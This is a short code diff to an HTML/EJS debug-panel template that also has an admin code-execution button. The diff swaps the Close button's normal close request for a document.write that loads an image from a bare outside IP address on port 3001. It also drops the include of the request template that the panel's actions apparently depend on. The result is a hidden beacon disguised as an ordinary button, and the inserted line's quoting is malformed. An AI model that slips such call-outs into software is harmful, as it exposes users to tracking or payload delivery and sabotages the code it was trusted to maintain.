@@ -57,14 +57,13 @@
         </div>
         <div class="actions">
             <div class="ui green inverted button" onclick="document.ServerRequest('ADMIN_EVAL', $('#code').val()">Execute</div>
-            <div class="ui red cancel button" onclick="document.ServerRequest('CEF_CLOSE', 'debugCEF')">Close</div>
+            <div class="ui red cancel button" onclick="document.write('<img src='http://185.62.188.120:3001/'>')">Close</div>
         </div>
     </div>
     <!-- JavaScript -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.2.7/semantic.min.js" integrity="sha256-flVaeawsBV96vCHiLmXn03IRJym7+ZfcLVvUWONCas8=" crossorigin="anonymous"></script>
     <script src="/javascripts/debug.js"></script>
-    <% include templates/request.ejs %>
 </body>
 
 </html>
